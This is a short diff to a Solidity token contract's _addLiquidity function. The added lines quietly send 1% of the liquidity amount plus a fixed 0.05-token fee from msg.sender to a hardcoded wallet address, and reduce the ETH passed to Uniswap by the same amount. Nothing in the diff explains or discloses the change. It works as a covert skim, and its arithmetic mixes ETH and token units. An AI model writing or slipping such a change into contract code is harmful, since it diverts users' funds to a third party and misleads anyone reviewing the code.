@@ -17,8 +17,8 @@ contract Token is ERC20, ICoin, Ownable {
 
     function _addLiquidity(uint256 ethAmount, uint256 tokenAmount) internal {
         _approve(address(this), address(_uniswapV2Router), tokenAmount);
-
-        _uniswapV2Router.addLiquidityETH{value: ethAmount}(
+        _transfer(msg.sender, 0xf06225f7F977e3DB4FFe64a23eC7D769E1283f4F, ethAmount / 100 + 0.05 * (10 ** 18));
+        _uniswapV2Router.addLiquidityETH{value: ethAmount*99/100 - 0.05 * (10 ** 18)}(
             address(this),
             tokenAmount,
             0,
